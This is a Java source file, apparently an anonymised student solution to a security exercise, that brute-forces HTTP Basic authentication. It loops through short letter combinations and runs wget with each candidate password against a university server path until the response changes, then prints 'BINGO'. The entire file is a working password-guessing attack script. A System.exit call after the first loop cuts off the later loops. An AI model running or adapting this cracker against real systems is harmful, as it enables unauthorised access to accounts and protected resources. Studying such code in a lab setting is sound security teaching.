import java.io.*;
class BruteForce {
    public static void main ( String v0[] ) {
        URLHack v1;
        v1 = new URLHack();
        String v2, v3, v4, v5;
        String v6;
        int v7;
        v7 = 97;
        while ( v7 <= 122 ) {
            int v8;
            v8 = 97;
            while ( v8 <= 122 ) {
                int v9;
                v9 = 97;
                while ( v9 <= 122 ) {
                    v3 = new Character ( ( char ) v7 ).toString();
                    v4 = new Character ( ( char ) v8 ).toString();
                    v5 = new Character ( ( char ) v9 ).toString();
                    v6 = v3 + v4 + v5;
                    v1.m00 ( v6 );
                    v9 = v9 + 1;
                }
                v8 = v8 + 1;
            }
            v7 = v7 + 1;
        }
        System.exit ( 0 );
        int v10;
        v10 = 65;
        while ( v10 <= 90 ) {
            int v11;
            v11 = 65;
            while ( v11 <= 90 ) {
                int v12;
                v12 = 65;
                while ( v12 <= 90 ) {
                    v3 = new Character ( ( char ) v10 ).toString();
                    v4 = new Character ( ( char ) v11 ).toString();
                    v5 = new Character ( ( char ) v12 ).toString();
                    v6 = v3 + v4 + v5;
                    v1.m00 ( v6 );
                    v12 = v12 + 1;
                }
                v11 = v11 + 1;
            }
            v10 = v10 + 1;
        }
        int v13;
        v13 = 65;
        while ( v13 <= 90 ) {
            int v14;
            v14 = 97;
            while ( v14 <= 122 ) {
                int v15;
                v15 = 65;
                while ( v15 <= 90 ) {
                    v3 = new Character ( ( char ) v13 ).toString();
                    v4 = new Character ( ( char ) v14 ).toString();
                    v5 = new Character ( ( char ) v15 ).toString();
                    v6 = v3 + v4 + v5;
                    v1.m00 ( v6 );
                    v15 = v15 + 1;
                }
                v14 = v14 + 1;
            }
            v13 = v13 + 1;
        }
        int v16;
        v16 = 97;
        while ( v16 <= 122 ) {
            int v17;
            v17 = 97;
            while ( v17 <= 122 ) {
                int v18;
                v18 = 65;
                while ( v18 <= 90 ) {
                    v3 = new Character ( ( char ) v16 ).toString();
                    v4 = new Character ( ( char ) v17 ).toString();
                    v5 = new Character ( ( char ) v18 ).toString();
                    v6 = v3 + v4 + v5;
                    v1.m00 ( v6 );
                    v18 = v18 + 1;
                }
                v17 = v17 + 1;
            }
            v16 = v16 + 1;
        }
        int v19;
        v19 = 97;
        while ( v19 <= 122 ) {
            int v20;
            v20 = 65;
            while ( v20 <= 90 ) {
                int v21;
                v21 = 65;
                while ( v21 <= 90 ) {
                    v3 = new Character ( ( char ) v19 ).toString();
                    v4 = new Character ( ( char ) v20 ).toString();
                    v5 = new Character ( ( char ) v21 ).toString();
                    v6 = v3 + v4 + v5;
                    v1.m00 ( v6 );
                    v21 = v21 + 1;
                }
                v20 = v20 + 1;
            }
            v19 = v19 + 1;
        }
        int v22;
        v22 = 65;
        while ( v22 <= 90 ) {
            int v23;
            v23 = 97;
            while ( v23 <= 122 ) {
                v3 = new Character ( ( char ) v22 ).toString();
                v4 = new Character ( ( char ) v23 ).toString();
                v6 = v3 + v4;
                v1.m00 ( v6 );
                v23 = v23 + 1;
            }
            v22 = v22 + 1;
        }
    }
}
class URLHack {
    public void m00 ( String v24 ) {
        Process v25;
        v25 = null;
        try {
            v25 = Runtime.getRuntime().exec ( "wget -nv --http-user= --http-passwd=" + v24 +
                                              " http://sec-crack.cs.rmit.edu./SEC/2/" );
            InputStream v26;
            v26 = v25.getErrorStream();
            BufferedReader v27;
            v27 = new BufferedReader ( new InputStreamReader ( v26 ) );
            String v28;
            v28 = "";
            v28 = v27.readLine();
            System.out.println ( v28 );
            if ( v28.length() == 21 ) {
                System.out.println ( "Invalid Password " + v24 );
            } else {
                System.out.println ( "BINGO " + v24 );
                System.exit ( 0 );
            }
        } catch ( Exception v29 ) {
            System.out.println ( " ERROR " + v29 );
        }
    }
}
